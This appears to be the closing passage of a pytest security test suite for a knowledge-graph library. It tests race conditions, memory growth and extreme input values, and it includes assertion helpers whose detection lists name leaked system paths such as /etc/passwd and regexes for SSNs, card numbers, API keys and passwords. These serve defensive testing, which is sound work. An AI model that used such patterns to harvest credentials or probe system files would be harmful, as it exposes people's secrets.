            t = threading.Thread(target=create_entity, args=(i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        # All should succeed
        assert len(entities_created) == 100
        assert all(entities_created)

    def test_concurrent_relationship_creation(self):
        """
        Test race condition in concurrent relationship creation.

        EXPECTED: Should handle concurrent operations safely.
        RISK: Duplicate relationships or corruption.

        REMEDIATION: Use atomic operations.
        """
        import threading

        # Create entities
        self.graph.add_entity("source", "Test", {})
        self.graph.add_entity("target", "Test", {})

        relationships_created = []

        def create_relationship(i):
            result = self.graph.add_relationship(
                source="source",
                target="target",
                relation_type=f"TEST_{i}",
                attributes={"index": i}
            )
            relationships_created.append(result)

        # Create relationships concurrently
        threads = []
        for i in range(100):
            t = threading.Thread(target=create_relationship, args=(i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        # All should succeed
        assert len(relationships_created) == 100

    # --------------------------------------------------------------
    # Memory Leak Tests
    # --------------------------------------------------------------

    def test_memory_leak_on_repeated_operations(self):
        """
        Test for memory leaks on repeated operations.

        EXPECTED: Memory usage should stabilize.
        RISK: Memory exhaustion over time.

        REMEDIATION: Proper cleanup and resource management.
        """
        import gc
        import sys

        # Get initial memory
        gc.collect()
        initial_objects = len(gc.get_objects())

        # Perform many operations
        for i in range(1000):
            self.graph.add_entity(
                name=f"mem_test_{i}",
                entity_type="Test",
                attributes={"data": "x" * 100}
            )
            if i % 100 == 0:
                self.graph.clear()

        # Check final memory
        gc.collect()
        final_objects = len(gc.get_objects())

        # Memory usage should not grow unbounded
        # (allow some growth, but not 10x)
        assert final_objects < initial_objects * 10

    # --------------------------------------------------------------
    # Integer Overflow Tests
    # --------------------------------------------------------------

    def test_integer_overflow_in_confidence(self):
        """
        Test integer overflow in confidence score.

        EXPECTED: Should handle extreme values safely.
        RISK: Integer overflow can cause unexpected behavior.

        REMEDIATION: Use bounds checking.
        """
        # Try to set extreme confidence values
        result = self.graph.add_entity(
            name="overflow_test",
            entity_type="Test",
            attributes={
                "confidence": 1e100,  # Very large number
                "score": -1e100  # Very negative number
            }
        )

        assert result is True
        entity = self.graph.get_entity("overflow_test")
        assert entity is not None

    def test_large_array_sizes(self):
        """
        Test handling of large arrays.

        EXPECTED: Should limit array sizes.
        RISK: Memory exhaustion.

        REMEDIATION: Implement size limits.
        """
        # Try to add entity with large array
        large_array = list(range(1000000))

        result = self.graph.add_entity(
            name="array_test",
            entity_type="Test",
            attributes={"array": large_array}
        )

        # Current: accepts (vulnerable)
        # Should reject or truncate
        assert result is not None


# ============================================================================
# SECURITY ASSERTION HELPERS
# ============================================================================

class SecurityAssertions:
    """
    Helper methods for security assertions.
    """

    @staticmethod
    def assert_no_sql_injection(response):
        """Assert response doesn't contain SQL error messages."""
        sql_errors = [
            "SQL syntax",
            "mysql_fetch",
            "ORA-",
            "PostgreSQL",
            "SQLite3::SQLException",
            "ODBC",
            "JDBC",
        ]

        response_str = str(response).lower()
        for error in sql_errors:
            assert error.lower() not in response_str

    @staticmethod
    def assert_no_xss_executed(response):
        """Assert XSS payload wasn't executed."""
        # Look for script tags in response (should be escaped)
        assert "<script>" not in str(response) or "&lt;script&gt;" in str(response)

    @staticmethod
    def assert_no_path_leakage(response):
        """Assert filesystem paths not leaked."""
        path_indicators = [
            "/etc/passwd",
            "C:\\Windows",
            "wwwroot",
            "htdocs",
            "/var/www",
        ]

        response_str = str(response)
        for indicator in path_indicators:
            assert indicator not in response_str

    @staticmethod
    def assert_no_sensitive_data_leak(response):
        """Assert sensitive data not leaked."""
        sensitive_patterns = [
            r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
            r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b',  # Credit card
            r'sk-[a-zA-Z0-9]{32,}',  # API key
            r'password["\']?\s*[:=]\s*["\']?[^\s"\']+',
        ]

        response_str = str(response)
        for pattern in sensitive_patterns:
            matches = re.findall(pattern, response_str, re.IGNORECASE)
            assert len(matches) == 0, f"Sensitive data pattern found: {pattern}"


# ============================================================================
# TEST REPORTING
# ============================================================================

@pytest.fixture(scope="session", autouse=True)
def security_report():
    """Generate security test report."""
    yield

    # Print summary after all tests
    print("\n" + "="*80)
    print("SECURITY TEST SUMMARY")
    print("="*80)
    print("\nCategories Tested:")
    print("1. Input Validation (SQLi, XSS, Command Injection, Path Traversal)")
    print("2. Authentication/Authorization (Access Control, Privilege Escalation)")
    print("3. Data Security (Sensitive data in logs, Encryption)")
    print("4. API Security (Rate limiting, DoS protection, CSRF)")
    print("5. Dependency Security (Vulnerabilities, License compliance)")
    print("\nRemediation Priority:")
    print("1. Implement authentication and authorization")
    print("2. Add input validation and sanitization")
    print("3. Implement rate limiting and DoS protection")
    print("4. Encrypt sensitive data at rest")
    print("5. Regular dependency scanning")
    print("="*80)


# ============================================================================
# TEST EXECUTION
# ============================================================================

if __name__ == "__main__":
    # Run tests with coverage
    pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "--durations=10",
        "-k", "test_"
    ])
